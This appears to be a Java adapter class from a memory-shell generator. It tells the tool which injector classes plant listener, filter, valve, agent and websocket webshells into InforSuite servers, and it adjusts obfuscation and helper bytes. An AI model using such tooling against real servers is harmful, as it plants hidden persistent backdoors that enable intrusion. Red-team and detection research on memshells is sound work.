package com.reajason.javaweb.memshell.server.inforsuite;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.glassfish.GlassFishRawWsHelperGenerator;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;

import java.util.Collections;
import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class InforSuite extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public Map<String, Object> getShellObfuscationOptionOverrides(String shellType) {
        if (AGENT_FILTER_CHAIN.equals(shellType) || CATALINA_AGENT_CONTEXT_VALVE.equals(shellType)) {
            // web-core 是未导入 javax.crypto 的 Felix bundle，Agent shell 不能携带 AES 解密例程。
            return Collections.singletonMap("enableAES", false);
        }
        return super.getShellObfuscationOptionOverrides(shellType);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.inforsuite.InforSuiteFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.inforsuite.InforSuiteFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.inforsuite.InforSuiteRawWsInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.inforsuite.InforSuiteWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.inforsuite.InforSuiteWebSocketInjector")
                .build();
    }

    /**
     * InforSuite 的连接器沿用 GlassFish 的 Grizzly，RawWebSocket 复用 GlassFish 的
     * helper；注入路径因 iasFilterConfigs 差异走 InforSuite 自己的实现。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(GlassFishRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
